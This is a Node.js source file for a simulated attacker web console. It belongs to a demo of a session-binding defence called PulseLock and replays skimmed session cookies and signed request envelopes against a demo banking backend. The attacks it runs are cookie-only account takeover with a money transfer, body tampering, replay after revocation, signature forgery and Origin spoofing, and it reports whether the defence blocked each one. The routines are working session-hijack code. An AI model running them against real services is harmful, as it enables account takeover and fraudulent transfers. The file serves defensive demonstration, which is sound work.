#!/usr/bin/env node
// =============================================================================
//  hacker-console.js  —  ATTACKER WEB CONSOLE (SIMULATED AiTM, DEMO USE ONLY)
// =============================================================================
//
//  The browser-driven equivalent of replay-cookie.js + tamper-request.js, for
//  the two-laptop LAN demo:
//
//    Laptop A (victim)   -> browses https://kaaval.demo/  (the SOC dashboard)
//                           and https://kaaval.demo/demo  (registers a passkey,
//                           logs in, makes a PulseLock-signed transfer).
//    Laptop B (attacker) -> runs the TLS proxy (attacker-proxy.js), which skims
//                           the victim's session cookie and signed request off
//                           the wire into capture files, AND runs THIS console,
//                           which the attacker drives from a browser to try to
//                           abuse what was skimmed.
//
//  WHY A SERVER AND NOT JUST A STATIC PAGE:
//    The whole attack is "send the victim's cookie / signed proof from somewhere
//    that isn't the victim's browser." A browser `fetch` cannot set the `Cookie`
//    or `Origin` headers (both are forbidden headers), and a cross-origin call
//    to the backend would be blocked by CORS anyway. So the static page is only
//    the UI; every real attack request is made HERE, server-side, with full
//    header control — exactly as the CLI scripts do. The page calls this
//    console's own same-origin API, and this console hits the backend.
//
//  Every attack request below hits the REAL backend at BACKEND_TARGET, so the
//  resulting SecurityEvent (proof_absent, body_hash_mismatch, nonce_reused, or
//  the baseline "allowed") flows over SSE to the victim's dashboard on Laptop A
//  and lights up its live feed. That is the point of the demo.
//
//  Built on Node's built-in http only — no npm install. Requires Node 18+ for
//  the global `fetch` (same requirement the sibling CLI scripts already have).
//
//  Env (all optional):
//    HACKER_PORT     port to serve the console UI on   (default 8080)
//    BACKEND_TARGET  gateway the attacks hit           (default http://localhost:8000)
//    CAPTURE_DIR     dir holding the capture files      (default this file's dir)

"use strict";

const http = require("http");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const HACKER_PORT = parseInt(process.env.HACKER_PORT || "8080", 10);
const BACKEND_TARGET = (process.env.BACKEND_TARGET || "http://localhost:8000").replace(/\/$/, "");
const CAPTURE_DIR = process.env.CAPTURE_DIR || __dirname;

const COOKIE_FILE = path.join(CAPTURE_DIR, ".captured-cookie");
const ENVELOPE_FILE = path.join(CAPTURE_DIR, ".captured-envelope.json");
const FEED_FILE = path.join(CAPTURE_DIR, ".captures.jsonl");
const PAGE_FILE = path.join(__dirname, "hacker-page.html");

const COOKIE_NAME = "kaaval_session";
const TRANSFER_PATH = "/api/transfer";

// --- capture readers --------------------------------------------------------

function readCapturedCookie() {
  try {
    const value = fs.readFileSync(COOKIE_FILE, "utf8").trim();
    return value || null;
  } catch {
    return null;
  }
}

function readCapturedEnvelope() {
  try {
    const env = JSON.parse(fs.readFileSync(ENVELOPE_FILE, "utf8"));
    if (env && typeof env === "object" && env.proof && env.body !== undefined) {
      return env;
    }
    return null;
  } catch {
    return null;
  }
}

// The gateway checks the envelope's asserted origin (check 3) BEFORE body_hash
// (check 4) and nonce (check 5). A replay that omits Origin fails early as
// request_mismatch and never reaches the checks these attacks want to trip, so
// reproduce the origin the proof was actually signed against.
function originFromProof(proof) {
  try {
    const decoded = JSON.parse(Buffer.from(proof, "base64").toString("utf8"));
    if (typeof decoded.origin === "string" && decoded.origin) return decoded.origin;
  } catch {
    // fall through
  }
  return "http://localhost:3000";
}

// The captured proof is base64(JSON of the real SignedRequestEnvelope) —
// decode it to pull out the session_id, needed to ask the gateway for a
// nonce on the victim's behalf (see forgeSignature() below).
function decodeProofSessionId(proof) {
  try {
    const decoded = JSON.parse(Buffer.from(proof, "base64").toString("utf8"));
    if (typeof decoded.session_id === "string" && decoded.session_id) return decoded.session_id;
  } catch {
    // fall through
  }
  return null;
}

function reasonFromResponseText(text) {
  try {
    const parsed = JSON.parse(text);
    const detail = parsed && parsed.detail;
    if (detail && typeof detail === "object" && typeof detail.reason === "string") {
      return detail.reason;
    }
    if (typeof detail === "string") return detail;
  } catch {
    // not JSON; leave null
  }
  return null;
}

// --- attack executors -------------------------------------------------------

// The one honest attack: use the stolen session exactly as a real attacker
// would — the cookie, from here, with NO proof and NO mode. The attacker does
// not (and cannot) choose the server's security posture. Whether this succeeds
// is decided entirely by whether the victim has enrolled that session in
// PulseLock. Same call every time; the OUTCOME is read from the real response,
// not pre-decided by a button label.
async function attemptTakeover() {
  const cookie = readCapturedCookie();
  if (!cookie) {
    return {
      ok: false,
      error: "No stolen cookie captured yet. Have the victim log in through the proxy first.",
    };
  }
  const url = `${BACKEND_TARGET}${TRANSFER_PATH}`;
  const body = JSON.stringify({ to_account: "acct-attacker", amount: 5000 });
  let res, text;
  try {
    res = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Cookie: `${COOKIE_NAME}=${cookie}`,
      },
      body,
    });
    text = await res.text();
  } catch (err) {
    return { ok: false, error: `Request to backend failed: ${err.message} (is start-demo.sh running?)` };
  }
  const reason = reasonFromResponseText(text);
  let payload = null;
  try {
    payload = JSON.parse(text);
  } catch {
    // leave null
  }

  if (res.ok) {
    const amount = payload && payload.amount !== undefined ? payload.amount : "?";
    const to = payload && payload.to_account ? payload.to_account : "?";
    return {
      ok: true,
      status: res.status,
      reason,
      body: text,
      verdict: `ACCOUNT TAKEN OVER — transferred ${amount} to ${to} as the victim, using the stolen cookie alone. No PulseLock on this session.`,
      verdictKind: "attack-worked",
    };
  }
  const blockedByPulselock = reason === "proof_absent";
  return {
    ok: true,
    status: res.status,
    reason,
    body: text,
    verdict: blockedByPulselock
      ? "BLOCKED by PulseLock — the victim enrolled this session, so the stolen cookie alone no longer proves anything (proof_absent)."
      : `Rejected (${reason || "see response"}) — the takeover did not go through.`,
    verdictKind: blockedByPulselock ? "defended" : "warn",
  };
}

async function postSigned(env, bodyObj) {
  const base = (process.env.BACKEND_TARGET ? BACKEND_TARGET : env.base_url || BACKEND_TARGET).replace(/\/$/, "");
  const mode = env.mode || "protected";
  const url = `${base}${env.path || TRANSFER_PATH}?mode=${mode}`;
  const origin = env.origin || originFromProof(env.proof);
  const res = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-KAAVAL-Proof": env.proof,
      Origin: origin,
      Cookie: `${COOKIE_NAME}=${env.cookie || readCapturedCookie() || ""}`,
    },
    body: JSON.stringify(bodyObj),
  });
  const text = await res.text();
  return { status: res.status, text };
}

async function tamperRequest(field, value) {
  const env = readCapturedEnvelope();
  if (!env) {
    return {
      ok: false,
      error: "No signed request captured yet. Have the victim make a PulseLock-protected transfer through the proxy first (Scene 3 setup).",
    };
  }
  const tampered = { ...env.body };
  const before = tampered[field];
  const coerced =
    typeof before === "number" && value !== "" && !Number.isNaN(Number(value))
      ? Number(value)
      : value;
  tampered[field] = coerced;
  let result;
  try {
    result = await postSigned(env, tampered);
  } catch (err) {
    return { ok: false, error: `Request to backend failed: ${err.message}` };
  }
  const reason = reasonFromResponseText(result.text);
  const blocked = reason === "body_hash_mismatch" || (result.status >= 400 && !result.text.includes('"status":"ok"'));
  return {
    ok: true,
    status: result.status,
    reason,
    body: result.text,
    verdict:
      reason === "body_hash_mismatch"
        ? `BLOCKED — body_hash_mismatch. The signature is bound to the victim's original ${field}=${JSON.stringify(before)}; rewriting it to ${JSON.stringify(coerced)} invalidates the proof.`
        : "Check the reason above; expected body_hash_mismatch.",
    verdictKind: reason === "body_hash_mismatch" ? "defended" : "warn",
    changed: { field, before, after: coerced },
  };
}

async function replaySignedVerbatim() {
  const env = readCapturedEnvelope();
  if (!env) {
    return {
      ok: false,
      error: "No signed request captured yet. Have the victim make a PulseLock-protected transfer through the proxy first.",
    };
  }
  let result;
  try {
    result = await postSigned(env, env.body);
  } catch (err) {
    return { ok: false, error: `Request to backend failed: ${err.message}` };
  }
  const reason = reasonFromResponseText(result.text);
  const blocked = reason === "nonce_reused" || (result.status >= 400 && !result.text.includes('"status":"ok"'));
  return {
    ok: true,
    status: result.status,
    reason,
    body: result.text,
    verdict:
      reason === "nonce_reused"
        ? "BLOCKED — nonce_reused. The single-use nonce was already spent by the victim's real request; the proof cannot be replayed."
        : "Check the reason above; expected nonce_reused (a fresh capture is needed if the victim has not sent a new signed request since the last replay).",
    verdictKind: reason === "nonce_reused" ? "defended" : "warn",
  };
}

// Replays the captured signed envelope completely unchanged, exactly like
// replaySignedVerbatim() — but the point of THIS attack is what happens
// after the victim has pressed "Revoke this session" on the demo page
// (POST /auth/session/revoke). Check 1 (session_inactive) runs before the
// signature, origin/path, body_hash, nonce or sequence checks, so a
// captured request that was never even replayed before is still refused —
// revocation beats a live, correctly-signed proof outright.
async function replayAfterRevoke() {
  const env = readCapturedEnvelope();
  if (!env) {
    return {
      ok: false,
      error: "No signed request captured yet. Have the victim make a PulseLock-protected transfer through the proxy first.",
    };
  }
  let result;
  try {
    result = await postSigned(env, env.body);
  } catch (err) {
    return { ok: false, error: `Request to backend failed: ${err.message}` };
  }
  const reason = reasonFromResponseText(result.text);

  // Same real request, pressed twice on cue — before the victim revokes it
  // genuinely still works (their session is alive), after they revoke it is
  // refused before the signature is even checked. Which branch fires is read
  // from the real response, not chosen by this button.
  if (result.status === 200) {
    let payload = null;
    try {
      payload = JSON.parse(result.text);
    } catch {
      // leave null
    }
    const amount = payload && payload.amount !== undefined ? payload.amount : "?";
    const to = payload && payload.to_account ? payload.to_account : "?";
    return {
      ok: true,
      status: result.status,
      reason,
      body: result.text,
      verdict: `REPLAY SUCCEEDED — the captured request executed for real (${amount} to ${to}). The victim's session is still live; have them press "Revoke this session", then run this again.`,
      verdictKind: "attack-worked",
    };
  }

  return {
    ok: true,
    status: result.status,
    reason,
    body: result.text,
    verdict:
      reason === "session_inactive"
        ? "BLOCKED — session_inactive. The victim revoked this session; a live session's own validly-signed request is refused before its signature is ever checked."
        : `Rejected (${reason || "see response"}) — not what this scene demonstrates. If the nonce was already spent by an earlier replay, capture a fresh signed request from the victim and try again.`,
    verdictKind: reason === "session_inactive" ? "defended" : "warn",
  };
}

// The attacker generates their OWN fresh ECDSA P-256 key pair and signs a
// request with it — everything else about the envelope is genuine: a real,
// just-issued nonce for the stolen session_id, the real origin/path, and a
// body_hash that matches the body actually sent. The private key bound to
// the victim's session never left their browser, so this is the one field
// that cannot be forged, however perfectly everything else is reproduced.
async function forgeSignature() {
  const env = readCapturedEnvelope();
  if (!env) {
    return {
      ok: false,
      error: "No signed request captured yet. Have the victim make a PulseLock-protected transfer through the proxy first.",
    };
  }
  const sessionId = decodeProofSessionId(env.proof);
  if (!sessionId) {
    return { ok: false, error: "Could not read a session_id out of the captured proof." };
  }

  const origin = env.origin || originFromProof(env.proof);
  const targetPath = env.path || TRANSFER_PATH;
  const bodyObj = { to_account: "acct-attacker-forged", amount: 7777 };
  const bodyStr = JSON.stringify(bodyObj);
  const bodyHash = crypto.createHash("sha256").update(bodyStr, "utf8").digest("hex");

  const base = (process.env.BACKEND_TARGET ? BACKEND_TARGET : env.base_url || BACKEND_TARGET).replace(/\/$/, "");
  let nonceRes, nonceJson;
  try {
    nonceRes = await fetch(`${base}/auth/nonce`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId }),
    });
    nonceJson = await nonceRes.json();
  } catch (err) {
    return { ok: false, error: `Could not fetch a nonce for the stolen session_id: ${err.message}` };
  }
  if (!nonceRes.ok || !nonceJson.nonce) {
    return {
      ok: false,
      error: `Gateway refused to issue a nonce for this session (HTTP ${nonceRes.status}) — it may have been revoked.`,
    };
  }

  // Any sequence number works here: check 2 (signature) fails before check
  // 6 (sequence) is ever reached, so there is nothing to guess correctly.
  const sequence = Date.now();
  const timestamp = new Date().toISOString();
  const canonical = [sessionId, "POST", origin, targetPath, bodyHash, nonceJson.nonce, String(sequence), timestamp].join("\n");

  const { privateKey } = crypto.generateKeyPairSync("ec", { namedCurve: "P-256" });
  const signature = crypto.sign("sha256", Buffer.from(canonical, "utf8"), {
    key: privateKey,
    dsaEncoding: "ieee-p1363", // raw r||s — matches what the browser's Web Crypto emits
  });

  const envelope = {
    session_id: sessionId,
    method: "POST",
    origin,
    path: targetPath,
    body_hash: bodyHash,
    nonce: nonceJson.nonce,
    sequence,
    timestamp,
    signature: signature.toString("base64"),
  };
  const proof = Buffer.from(JSON.stringify(envelope), "utf8").toString("base64");

  let result;
  try {
    result = await postSigned({ ...env, origin, path: targetPath, proof }, bodyObj);
  } catch (err) {
    return { ok: false, error: `Request to backend failed: ${err.message}` };
  }
  const reason = reasonFromResponseText(result.text);
  return {
    ok: true,
    status: result.status,
    reason,
    body: result.text,
    verdict:
      reason === "signature_invalid"
        ? "BLOCKED — signature_invalid. A real nonce, the real origin/path and a matching body_hash all checked out; only the signature — made with a key generated here, not the victim's browser — was wrong."
        : `Not signature_invalid (got ${reason || "see response"}).`,
    verdictKind: reason === "signature_invalid" ? "defended" : "warn",
  };
}

// Resends the captured envelope completely unmodified — same signature,
// same body — but with the actual Origin header changed. The signature
// covers the envelope's OWN asserted origin, so it still verifies; the
// request fails one check later, when the asserted origin is compared
// against what the request actually arrived with.
async function originMismatch() {
  const env = readCapturedEnvelope();
  if (!env) {
    return {
      ok: false,
      error: "No signed request captured yet. Have the victim make a PulseLock-protected transfer through the proxy first.",
    };
  }
  const spoofedOrigin = "https://attacker-controlled.demo"; // deliberately fake, not a real site
  let result;
  try {
    result = await postSigned({ ...env, origin: spoofedOrigin }, env.body);
  } catch (err) {
    return { ok: false, error: `Request to backend failed: ${err.message}` };
  }
  const reason = reasonFromResponseText(result.text);
  return {
    ok: true,
    status: result.status,
    reason,
    body: result.text,
    verdict:
      reason === "request_mismatch"
        ? `BLOCKED — request_mismatch. The proof is untouched and its signature still verifies; resending it from ${spoofedOrigin} instead of the origin it was actually signed for invalidates it anyway.`
        : `Not request_mismatch (got ${reason || "see response"}).`,
    verdictKind: reason === "request_mismatch" ? "defended" : "warn",
  };
}

// --- tiny HTTP plumbing -----------------------------------------------------

function sendJson(res, status, obj) {
  const payload = JSON.stringify(obj);
  res.writeHead(status, {
    "Content-Type": "application/json",
    "Cache-Control": "no-store",
  });
  res.end(payload);
}

function readJsonBody(req) {
  return new Promise((resolve) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      if (chunks.length === 0) return resolve({});
      try {
        resolve(JSON.parse(Buffer.concat(chunks).toString("utf8")));
      } catch {
        resolve({});
      }
    });
    req.on("error", () => resolve({}));
  });
}

function maskCookie(value) {
  if (!value) return null;
  if (value.length <= 12) return `${value.slice(0, 4)}…`;
  return `${value.slice(0, 8)}…${value.slice(-4)} (${value.length} chars)`;
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://localhost:${HACKER_PORT}`);
  const route = url.pathname;

  if (req.method === "GET" && (route === "/" || route === "/index.html")) {
    fs.readFile(PAGE_FILE, (err, data) => {
      if (err) {
        res.writeHead(500, { "Content-Type": "text/plain" });
        res.end(`hacker-page.html not found next to hacker-console.js: ${err.message}`);
        return;
      }
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" });
      res.end(data);
    });
    return;
  }

  // Live interception feed (Server-Sent Events). Streams every capture the proxy
  // appends to .captures.jsonl to the attacker dashboard as it happens. The proxy
  // and this console are separate processes, so we tail the file by polling its
  // size and emitting any newly-appended lines — robust across platforms and to
  // the proxy truncating the file on its own restart.
  if (req.method === "GET" && route === "/api/capture-stream") {
    res.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-store",
      Connection: "keep-alive",
    });
    res.write(": connected\n\n");

    let offset = 0;
    let carry = "";

    const emitLine = (line) => {
      const trimmed = line.trim();
      if (trimmed) res.write(`data: ${trimmed}\n\n`);
    };

    const pump = () => {
      let size;
      try {
        size = fs.statSync(FEED_FILE).size;
      } catch {
        return; // feed file not created yet; try again next tick
      }
      if (size < offset) {
        // file was truncated (proxy restarted) — start over
        offset = 0;
        carry = "";
      }
      if (size === offset) return;
      let chunk;
      try {
        const fd = fs.openSync(FEED_FILE, "r");
        const buf = Buffer.alloc(size - offset);
        fs.readSync(fd, buf, 0, buf.length, offset);
        fs.closeSync(fd);
        chunk = buf.toString("utf8");
      } catch {
        return;
      }
      offset = size;
      const parts = (carry + chunk).split("\n");
      carry = parts.pop() ?? "";
      for (const line of parts) emitLine(line);
    };

    // Replay whatever is already in the feed, then poll for new lines.
    pump();
    const interval = setInterval(pump, 500);
    const heartbeat = setInterval(() => res.write(": ping\n\n"), 15000);
    const stop = () => {
      clearInterval(interval);
      clearInterval(heartbeat);
    };
    req.on("close", stop);
    res.on("error", stop);
    return;
  }

  if (req.method === "GET" && route === "/api/captures") {
    const cookie = readCapturedCookie();
    const env = readCapturedEnvelope();
    sendJson(res, 200, {
      backend: BACKEND_TARGET,
      cookie: cookie ? { present: true, preview: maskCookie(cookie) } : { present: false },
      envelope: env
        ? {
            present: true,
            path: env.path || TRANSFER_PATH,
            mode: env.mode || "protected",
            body: env.body,
            origin: env.origin || originFromProof(env.proof),
            proofPreview: `${String(env.proof).slice(0, 16)}… (${String(env.proof).length} chars)`,
          }
        : { present: false },
    });
    return;
  }

  if (req.method === "POST" && route === "/api/takeover") {
    sendJson(res, 200, await attemptTakeover());
    return;
  }

  if (req.method === "POST" && route === "/api/tamper") {
    const { field, value } = await readJsonBody(req);
    sendJson(res, 200, await tamperRequest(field || "amount", value === undefined ? "999999" : String(value)));
    return;
  }

  if (req.method === "POST" && route === "/api/replay-signed") {
    sendJson(res, 200, await replaySignedVerbatim());
    return;
  }

  if (req.method === "POST" && route === "/api/replay-after-revoke") {
    sendJson(res, 200, await replayAfterRevoke());
    return;
  }

  if (req.method === "POST" && route === "/api/forge-signature") {
    sendJson(res, 200, await forgeSignature());
    return;
  }

  if (req.method === "POST" && route === "/api/origin-mismatch") {
    sendJson(res, 200, await originMismatch());
    return;
  }

  res.writeHead(404, { "Content-Type": "text/plain" });
  res.end("not found");
});

server.listen(HACKER_PORT, () => {
  console.log(`[hacker-console] SIMULATED ATTACKER CONSOLE — DEMO ONLY`);
  console.log(`[hacker-console] UI:       http://localhost:${HACKER_PORT}/`);
  console.log(`[hacker-console] attacks hit backend: ${BACKEND_TARGET}`);
  console.log(`[hacker-console] reading captures from: ${CAPTURE_DIR}`);
  console.log(`[hacker-console] every attempt appears on the victim's dashboard live feed.`);
});

server.on("error", (err) => {
  if (err.code === "EADDRINUSE") {
    console.error(`[hacker-console] FATAL: port ${HACKER_PORT} already in use. Set HACKER_PORT=... to change it.`);
  } else {
    console.error("[hacker-console] FATAL:", err.message);
  }
  process.exit(1);
});
